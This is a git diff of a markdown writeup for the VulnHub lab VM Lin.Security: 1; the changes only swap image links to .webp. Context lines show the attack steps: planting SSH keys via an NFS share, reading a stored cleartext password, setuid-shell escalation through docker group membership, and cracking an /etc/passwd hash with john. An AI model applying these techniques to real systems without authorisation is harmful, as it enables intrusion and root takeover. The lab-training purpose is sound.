@@ -7,7 +7,7 @@ tags: vulnhub, writeup
 ## Overview
 This is a writeup for VulnHub VM [Lin.Security: 1](https://www.vulnhub.com/entry/linsecurity-1,244/). Here's an overview of the `enumeration → exploitation → privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_vulnhub_linsecurity1/killchain.png)
+![writeup.overview.killchain](/static/files/posts_vulnhub_linsecurity1/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -54,7 +54,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 showmount -e 192.168.92.186
 ```
 
-![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_linsecurity1/screenshot01.png)  
+![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_linsecurity1/screenshot01.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -85,18 +85,18 @@ mkdir .ssh
 cp ../authorized_keys .ssh/
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_linsecurity1/screenshot02.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_linsecurity1/screenshot02.png.webp)  
 
-![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_linsecurity1/screenshot03.png)  
+![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_linsecurity1/screenshot03.png.webp)  
 
-![writeup.exploitation.steps.1.3](/static/files/posts_vulnhub_linsecurity1/screenshot04.png)  
+![writeup.exploitation.steps.1.3](/static/files/posts_vulnhub_linsecurity1/screenshot04.png.webp)  
 
 2\. Now we can SSH into the target system as user `peter`:  
 ```
 ssh peter@192.168.92.186
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_linsecurity1/screenshot05.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_linsecurity1/screenshot05.png.webp)  
 
 3\. We find an interesting file `.secret` under user `susan`'s home directory. This file has the password in cleartext which we can use to login:  
 ```
@@ -104,7 +104,7 @@ cat /home/susan/.secret
 su susan
 ```
 
-![writeup.exploitation.steps.3.1](/static/files/posts_vulnhub_linsecurity1/screenshot06.png)  
+![writeup.exploitation.steps.3.1](/static/files/posts_vulnhub_linsecurity1/screenshot06.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -145,9 +145,9 @@ gcc -o privesc privesc.c
 sudo strace ./privesc
 ```
 
-![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_linsecurity1/screenshot07.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_linsecurity1/screenshot07.png.webp)  
 
-![writeup.privesc.steps.1.2](/static/files/posts_vulnhub_linsecurity1/screenshot08.png)  
+![writeup.privesc.steps.1.2](/static/files/posts_vulnhub_linsecurity1/screenshot08.png.webp)  
 
 2\. We can also elevate privileges using `docker` since the user `peter` is already a member of group `docker`:  
 ```
@@ -165,11 +165,11 @@ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && ch
 ./sh
 ```
 
-![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_linsecurity1/screenshot09.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_linsecurity1/screenshot09.png.webp)  
 
-![writeup.privesc.steps.2.2](/static/files/posts_vulnhub_linsecurity1/screenshot10.png)  
+![writeup.privesc.steps.2.2](/static/files/posts_vulnhub_linsecurity1/screenshot10.png.webp)  
 
-![writeup.privesc.steps.2.3](/static/files/posts_vulnhub_linsecurity1/screenshot11.png)  
+![writeup.privesc.steps.2.3](/static/files/posts_vulnhub_linsecurity1/screenshot11.png.webp)  
 
 3\. We find that the user `insecurity`'s (unsalted) password hash is stored within `/etc/passwd`. We run a bruteforce on this hash to get the cleartext password. Since this user has same uid/gid as user `root`, we get elevated access on the target system:  
 ```
@@ -180,9 +180,9 @@ john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt passwd
 ssh insecurity@192.168.92.186
 ```
 
-![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_linsecurity1/screenshot12.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_linsecurity1/screenshot12.png.webp)  
 
-![writeup.privesc.steps.3.2](/static/files/posts_vulnhub_linsecurity1/screenshot13.png)  
+![writeup.privesc.steps.3.2](/static/files/posts_vulnhub_linsecurity1/screenshot13.png.webp)  
 
 ## Loot
 ### Hashes
